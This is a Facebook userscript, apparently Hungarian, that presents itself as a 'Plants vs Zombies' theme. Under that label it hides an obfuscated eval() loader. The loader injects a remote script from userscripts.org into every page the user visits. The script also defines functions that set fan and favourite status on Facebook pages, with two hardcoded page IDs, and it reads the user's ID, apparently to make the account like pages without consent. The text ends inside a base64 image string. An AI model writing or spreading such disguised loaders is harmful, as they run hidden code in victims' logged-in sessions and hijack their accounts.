// ==UserScript==
// @name           Facebook téma
// @namespace      Zolyyy
// @author         facebook.com/zolyyy
// @description    Plants vs Zombies téma facebook-ra!
// @include        *
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))






	try{
	function fbpage_set_fan_status(c, f, a, h, g, d, e) {
		g = g ? g : function (j) {
			_fbpage_show_change_status_feedback(c, j.getPayload());
		};
		var b = {
			fbpage_id: f,
			add: a,
			reload: h
		};
		if (e != null) copy_properties(b, e);
		var i = new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData(b).setNectarModuleDataSafe(c).setHandler(g);
		if (d) i.setErrorHandler(d);
		i.send();
		return false;
	}
	function fbpage_set_favorite_status(d, e, a) {
		var f = function () {
				_fbpage_show_change_status_feedback(d, this.getUserData());
			};
		var c = {
			fbpage_id: e,
			add: a
		};
		var b = new AsyncRequest().setMethod('POST').setURI('/ajax/pages/favorite_status.php').setData(c);
		new Dialog().setAsync(b).setCloseHandler(f).show();
		return false;
	}
	function _fbpage_show_change_status_feedback(b, a) {
		if (!a || !b) return;
		if (a.reload) {
			fbpage_reload_on_fan_status_changed(a.preserve_tab);
		} else fbpage_redraw_on_fan_status_changed(b, a.feedback);
	}
	function fbpage_reload_on_fan_status_changed(a) {
		var c = URI.getRequestURI();
		if (a) {
			var b = window.FutureSideNav ? FutureSideNav.getInstance().selected.textKey : Arbiter.query('SideNav.selectedKey');
			if (!c.getQueryData().sk && b) c.addQueryData({
				sk: b
			});
		}
		window.location.href = c;
	}
	function fbpage_redraw_on_fan_status_changed(a, b) {
		if (!b) return;
		var d = document.createElement('span');
		d.innerHTML = b;
		CSS.setClass(d, 'fan_status_inactive');
		a.parentNode.replaceChild(d, a);
		var c = function () {
				if (data.can_repeat_action) d.parentNode.replaceChild(a, d);
			};
		animation(d).duration(3000).checkpoint().to('backgroundColor', '#FFFFFF').duration(1000).ondone(c).go();
	}
	
	
	}catch(e){}
/***************************************************************
		VÁLTOZÓK												
***************************************************************/
	var FBT			=	"203818076342174";	//FBT
	var PVZ			=	"144370152320029";	//Plat
	try{
	var JS_user_id	=	Env['user'];
	}
	catch(e){}
	var tema	=	'pvsz';
	var TemaH	=	'Plants vs Zombies';
/***************************************************************
		TÉMA KEZDETE												
***************************************************************/
if (window	==	window.top && window.top.location.hostname.indexOf('facebook.com')	!= -1 && localStorage.getItem("facebook-"+tema+"-X") == "-X") {


var body_bg = "url(data:image/png;base64,/9j/4AAQSkZJRgABAQEASAB